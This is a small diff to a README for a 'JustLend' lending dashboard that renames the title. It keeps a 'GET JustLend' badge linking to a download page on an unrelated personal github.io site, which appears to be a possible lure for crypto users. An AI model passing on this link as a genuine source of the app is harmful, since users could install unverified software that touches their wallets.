@@ -1,4 +1,4 @@
-# JustLend - Decentralized Lending Dashboard
+# JustLend App - Decentralized Lending Dashboard
 
 [![GET JustLend](https://img.shields.io/badge/GET%20%E2%80%94%20JustLend-0078D6?style=for-the-badge&logoColor=white)](https://emersonelliottcgck.github.io/.github/justLend-app)
 
